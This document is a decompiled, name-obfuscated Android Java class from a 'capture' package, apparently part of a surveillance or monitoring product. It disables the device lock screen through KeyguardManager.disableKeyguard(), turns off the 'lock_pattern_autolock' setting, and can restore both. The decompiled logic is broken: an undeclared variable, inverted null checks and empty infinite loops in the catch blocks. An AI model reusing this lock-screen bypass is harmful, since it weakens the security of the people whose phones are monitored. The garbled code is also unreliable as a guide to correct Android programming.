package com.vvt.capture.d;

import android.app.KeyguardManager;
import android.app.KeyguardManager.KeyguardLock;
import android.content.ContentResolver;
import android.content.Context;
import android.provider.Settings.System;
import com.vvt.base.RunningMode;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private final KeyguardManager c;
  private final ContentResolver d;
  private KeyguardManager.KeyguardLock e;
  
  public a(RunningMode paramRunningMode, Context paramContext)
  {
    Object localObject = (KeyguardManager)paramContext.getSystemService("keyguard");
    this.c = ((KeyguardManager)localObject);
    localObject = paramContext.getContentResolver();
    this.d = ((ContentResolver)localObject);
  }
  
  private void a(String paramString, boolean paramBoolean)
  {
    for (;;)
    {
      try
      {
        ContentResolver localContentResolver = this.d;
        if (paramBoolean)
        {
          i = 1;
          Settings.System.putInt(localContentResolver, paramString, i);
          return;
        }
      }
      catch (Exception localException)
      {
        int i;
        boolean bool = b;
        if (!bool) {
          continue;
        }
        continue;
      }
      i = 0;
    }
  }
  
  private void c()
  {
    bool = a;
    if (bool) {}
    try
    {
      Object localObject = this.e;
      if (localObject != null)
      {
        localObject = this.c;
        String str = "keyguard";
        localObject = ((KeyguardManager)localObject).newKeyguardLock(str);
        this.e = ((KeyguardManager.KeyguardLock)localObject);
        localObject = this.e;
        ((KeyguardManager.KeyguardLock)localObject).disableKeyguard();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
  }
  
  private void d()
  {
    a("lock_pattern_autolock", false);
  }
  
  private void e()
  {
    try
    {
      Object localObject = this.e;
      if (localObject != null)
      {
        localObject = this.c;
        String str = "keyguard";
        localObject = ((KeyguardManager)localObject).newKeyguardLock(str);
        this.e = ((KeyguardManager.KeyguardLock)localObject);
        localObject = this.e;
        ((KeyguardManager.KeyguardLock)localObject).reenableKeyguard();
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  private void f()
  {
    String str = "lock_pattern_autolock";
    try
    {
      a(str, false);
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    c();
    d();
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    e();
    f();
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/d/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */